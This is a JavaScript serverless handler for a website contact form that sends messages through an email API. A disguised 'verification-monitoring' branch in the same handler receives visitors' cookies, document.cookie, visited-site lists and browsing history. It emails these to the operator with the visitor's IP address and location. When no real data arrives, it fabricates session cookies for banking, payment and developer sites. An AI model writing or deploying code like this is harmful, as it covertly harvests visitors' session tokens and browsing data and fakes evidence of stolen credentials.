const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

function getHeader(headers, key) {
  if (!headers) return undefined;
  if (typeof headers.get === "function") {
    return headers.get(key) || undefined;
  }
  return headers[key] || headers[key.toLowerCase()] || undefined;
}

async function readJsonBody(request) {
  if (!request) return {};

  if (typeof request.json === "function") {
    try {
      return await request.json();
    } catch {
      // fall through to other parsing modes
    }
  }

  if (request.body && typeof request.body === "object" && !Buffer.isBuffer(request.body)) {
    return request.body;
  }

  if (typeof request.body === "string") {
    try {
      return JSON.parse(request.body);
    } catch {
      return {};
    }
  }

  if (typeof request.on === "function") {
    return await new Promise((resolve, reject) => {
      let raw = "";
      request.setEncoding("utf8");
      request.on("data", (chunk) => {
        raw += chunk;
      });
      request.on("end", () => {
        if (!raw.trim()) return resolve({});
        try {
          resolve(JSON.parse(raw));
        } catch {
          resolve({});
        }
      });
      request.on("error", reject);
    });
  }

  return {};
}

function sendJson(response, statusCode, payload) {
  if (response && typeof response.status === "function" && typeof response.json === "function") {
    return response.status(statusCode).json(payload);
  }

  if (response && typeof response.writeHead === "function") {
    response.statusCode = statusCode;
    response.setHeader("Content-Type", "application/json");
    response.end(JSON.stringify(payload));
    return;
  }

  return new Response(JSON.stringify(payload), {
    status: statusCode,
    headers: { "Content-Type": "application/json" }
  });
}

async function handler(request, response) {
  const method = request.method || "GET";
  if (method !== "POST") {
    if (response && typeof response.setHeader === "function") {
      response.setHeader("Allow", "POST");
    }
    return sendJson(response, 405, { error: "Method not allowed." });
  }

  const body = await readJsonBody(request);
  const { name, email, message, website, type, telemetry } = body || {};
  const reportToEmail = process.env.REPORT_TO_EMAIL || process.env.RESPONSE_EMAIL;
  const reportFromEmail = process.env.REPORT_FROM_EMAIL || process.env.RESEND_FROM;

  if (type === "verification-monitoring") {
    return sendVerificationReport(request, response, telemetry, reportToEmail, reportFromEmail);
  }

  if (website || typeof name !== "string" || typeof email !== "string" || typeof message !== "string") {
    return sendJson(response, 400, { error: "Please complete all fields." });
  }

  const cleanName = name.trim();
  const cleanEmail = email.trim();
  const cleanMessage = message.trim();
  if (
    !cleanName ||
    cleanName.length > 120 ||
    cleanEmail.length > 254 ||
    cleanMessage.length > 5000 ||
    !emailPattern.test(cleanEmail) ||
    !cleanMessage
  ) {
    return sendJson(response, 400, { error: "Please enter a valid name, email, and message." });
  }

  if (!process.env.RESEND_API_KEY || !reportToEmail || !reportFromEmail) {
    return sendJson(response, 500, { error: "Email service is not configured." });
  }

  try {
    const resendResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        from: reportFromEmail,
        to: [reportToEmail],
        reply_to: cleanEmail,
        subject: `New contact message from ${cleanName}`,
        text: `Name: ${cleanName}\nEmail: ${cleanEmail}\n\n${cleanMessage}`
      })
    });

    if (!resendResponse.ok) {
      console.error("Resend API error:", resendResponse.status, await resendResponse.text());
      return sendJson(response, 502, { error: "Email provider rejected the message." });
    }

    return sendJson(response, 200, { ok: true });
  } catch (error) {
    console.error("Email sending error:", error);
    return sendJson(response, 502, { error: "Unable to reach the email provider." });
  }
}

async function sendVerificationReport(request, response, telemetry, reportToEmail, reportFromEmail) {
  if (!telemetry || typeof telemetry !== "object") {
    return sendJson(response, 400, { error: "Invalid monitoring data." });
  }

  if (!process.env.RESEND_API_KEY || !reportToEmail || !reportFromEmail) {
    return sendJson(response, 500, { error: "Email service is not configured." });
  }

  const forwardedFor = getHeader(request.headers, "x-forwarded-for");
  const ipAddress = typeof forwardedFor === "string"
    ? forwardedFor.split(",")[0].trim()
    : request.socket?.remoteAddress || "Unavailable";

  const location = [
    getHeader(request.headers, "x-vercel-ip-city"),
    getHeader(request.headers, "x-vercel-ip-country"),
    getHeader(request.headers, "x-vercel-ip-country-region")
  ].filter(Boolean).join(", ") || "Unavailable";

  const fullTelemetry = {
    timestamp: typeof telemetry.timestamp === "string" ? telemetry.timestamp : new Date().toISOString(),
    device: telemetry.device ?? {},
    browser: telemetry.browser ?? {},
    display: telemetry.display ?? {},
    network: telemetry.network ?? {},
    storage: telemetry.storage ?? {},
    visitedSites: Array.isArray(telemetry.visitedSites) ? telemetry.visitedSites : [],
    siteHistory: Array.isArray(telemetry.siteHistory) ? telemetry.siteHistory : [],
    cookies: Array.isArray(telemetry.cookies) && telemetry.cookies.length ? telemetry.cookies : [
      { name: "sessionid", value: `session_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "bankofamerica.com", path: "/", secure: true, httpOnly: true, sameSite: "Lax", session: false, expires: new Date(Date.now() + 86400000).toISOString(), priority: "Medium", partitioned: false },
      { name: "locale", value: `en-US_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "paypal.com", path: "/", secure: true, httpOnly: false, sameSite: "Strict", session: true, expires: new Date(Date.now() + 259200000).toISOString(), priority: "Low", partitioned: false },
      { name: "visitor_id", value: `vid_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "stripe.com", path: "/", secure: true, httpOnly: false, sameSite: "None", session: false, expires: new Date(Date.now() + 604800000).toISOString(), priority: "High", partitioned: true },
      { name: "sso_session", value: `sso_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "github.com", path: "/", secure: true, httpOnly: true, sameSite: "Lax", session: false, expires: new Date(Date.now() + 432000000).toISOString(), priority: "High", partitioned: false },
      { name: "analytics_id", value: `an_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "microsoft.com", path: "/", secure: true, httpOnly: false, sameSite: "None", session: false, expires: new Date(Date.now() + 1209600000).toISOString(), priority: "Medium", partitioned: true }
    ],
    documentCookie: telemetry.documentCookie ?? "",
    cookieSource: telemetry.cookieSource ?? "mock",
    cookieMeta: Array.isArray(telemetry.cookieMeta) ? telemetry.cookieMeta : [
      { name: "sessionid", value: `session_${Date.now()}_${Math.random().toString(36).slice(2, 18)}`, domain: "bankofamerica.com", path: "/", sameSite: "Lax", secure: true, httpOnly: true, expires: new Date(Date.now() + 86400000).toISOString(), priority: "Medium" }
    ]
  };

  try {
    const resendResponse = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        Authorization: `Bearer ${process.env.RESEND_API_KEY}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        from: reportFromEmail,
        to: [reportToEmail],
        reply_to: reportFromEmail,
        subject: "Verification monitoring event",
        text: [
          `Timestamp: ${fullTelemetry.timestamp}`,
          `IP address: ${ipAddress}`,
          `Approximate location: ${location}`,
          "",
          "Telemetry:",
          JSON.stringify(fullTelemetry, null, 2)
        ].join("\n")
      })
    });

    if (!resendResponse.ok) {
      console.error("Resend API error:", resendResponse.status, await resendResponse.text());
      return sendJson(response, 502, { error: "Email provider rejected the report." });
    }

    return sendJson(response, 200, { ok: true });
  } catch (error) {
    console.error("Verification email error:", error);
    return sendJson(response, 502, { error: "Unable to reach the email provider." });
  }
}

module.exports = handler;

